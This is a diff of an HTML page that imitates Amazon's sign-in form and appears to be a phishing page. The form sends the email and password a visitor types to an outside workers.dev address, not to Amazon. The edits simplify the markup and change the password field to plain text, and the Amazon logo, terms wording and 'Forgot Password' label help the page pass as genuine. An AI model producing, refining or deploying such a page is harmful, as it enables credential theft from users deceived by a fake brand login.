@@ -8,27 +8,18 @@
 </head>
 <body>
     <div class="main">
-        <img src="logo.png" alt="Amazon Logo" class="logo">
+            <img src="logo.png">
         <div class="cont">
             <div class="box">
                 <h1>Sign in</h1>
                 <form action="https://amazon-college-extension-activity.bradithya614.workers.dev/" method="POST">
-                    <label for="email">Email or mobile phone number</label>
-                    <input type="email" id="email" name="user" required>
-                    
-                    <label for="password">
-                        Password 
-                        <a href="#" class="split">Forgot Password?</a>
-                    </label>
-                    <input type="password" id="password" name="pass" required>
-                    
-                    <input type="submit" value="Sign in" class="btn-submit">
+                    <label>Email or mobile phone number</label>
+                    <input type="text" name="User">
+                    <label>Password <span class="split">Forgot Password</span></label>
+                    <input type="text" name="Pass">
+                    <input type="submit" value="Sign in">
                 </form>
-                
-                <p>By continuing, you agree to Amazon's 
-                    <a href="#" class="col_blue">Conditions of Use</a> and 
-                    <a href="#" class="col_blue">Privacy Notice</a>.
-                </p>
+                <p>By continuing, you agree to Amazon's <span class="col_blue">Conditions of Use</span> and <span class="col_blue">Privacy Notice</span>.</p>
             </div>
         </div>
     </div>
